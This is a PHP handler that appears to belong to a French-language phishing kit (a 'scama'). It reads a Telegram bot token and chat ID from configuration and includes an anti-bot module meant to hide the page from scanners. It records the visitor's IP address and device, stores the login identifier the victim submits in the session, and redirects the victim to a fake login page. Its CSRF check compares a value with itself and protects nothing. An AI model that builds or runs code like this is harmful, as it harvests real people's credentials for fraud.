<?php
declare(strict_types=1);
if (!defined('ALLOW_INCLUDE')) {
    define('ALLOW_INCLUDE', true);
}

ob_start();
session_start();
date_default_timezone_set('Europe/Paris');
header('Content-Type: application/json');
require_once __DIR__ . '/../modules/load_config.php';
require_once __DIR__ . '/../modules/sessions.php';
require_once __DIR__ . '/../antibots/all.php';
require_once __DIR__ . '/../func/counter.php'; 

$bot_token = getConfig('BOT_TOKEN', '');
$chat_id   = getConfig('CHAT_ID', '');
$scama_name   = getConfig('SCAMA_NAME', '');
//------- INFOS CLIENTS --------------------//
$ip          = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Inconnu';
$device_type = $_SESSION['visitor']['device_type'] ?? 'Inconnu';
$device      = $_SESSION['visitor']['device_model'] ?? 'Inconnu';
$datetime    = date('d/m/Y H:i:s');
$uid         = $_SESSION['user_id'] ?? uniqid('user_', true);

//--------------------------------------//



// ---------------------------
//      Protection BOT
// ---------------------------
$token = $_SESSION['csrf_token'] ?? '';

if (!hash_equals($_SESSION['csrf_token'] ?? '', $token)) {
    http_response_code(403);
    exit('Error: Invalid CSRF token');
}


if (empty($bot_token) || empty($chat_id)) {
    ob_end_clean();
    http_response_code(500);
    echo json_encode(['error' => 'Aucune clé télégram configurée. Regarde le config.php']);
    exit;
}


if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Méthode non autorisée.');
}


if (empty($_POST['identifiant'])) { 
    header('Location: ../pages/index.php?error=error');
    exit;
}


if (!isset($_POST['identifiant_submit'])) { 
    header('Location: ../pages/index.php?error=error');
    exit;
}

$identifiant = htmlspecialchars($_POST['identifiant'], ENT_QUOTES, 'UTF-8') ?? '';
$_SESSION['identifiant']  = $identifiant;

try {   
    ob_end_clean();
    header('Location: ../pages/login.php');
    exit;
} catch (Exception $e) {
    ob_end_clean();
    http_response_code(500);
    echo json_encode(['error' => "Erreur Telegram : " . $e->getMessage()]);
    exit;
}
